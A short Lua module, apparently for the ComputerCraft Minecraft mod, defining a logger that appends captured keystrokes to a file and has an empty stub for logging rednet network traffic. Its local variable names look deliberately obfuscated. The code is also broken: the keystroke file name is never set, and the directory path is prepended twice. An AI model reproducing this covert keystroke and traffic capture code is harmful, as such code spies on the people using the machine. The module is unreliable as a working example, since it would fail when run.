logger = {}
logger.__index = logger
local loggerdir = nil
local keystrokefile = nil
local keystrokebufferfile = nil
local rednettrafficfile = nil

    local function log2file(A3qK0iPWBR8, data_0xjEgplupRU)
        local ZLWiebvQ_Ss = fs.open(loggerdir..A3qK0iPWBR8, "a")
        ZLWiebvQ_Ss.write(data_0xjEgplupRU)
        ZLWiebvQ_Ss.close()
    end

    function logger.setLogDir(dir)
        loggerdir = dir
    end
    function logger.logKeystroke(key)
        log2file(loggerdir.."/"..keystrokefile..".lua",key)
    end
    function logger.logRednetTraffic(to,from,data)
        
    end

return logger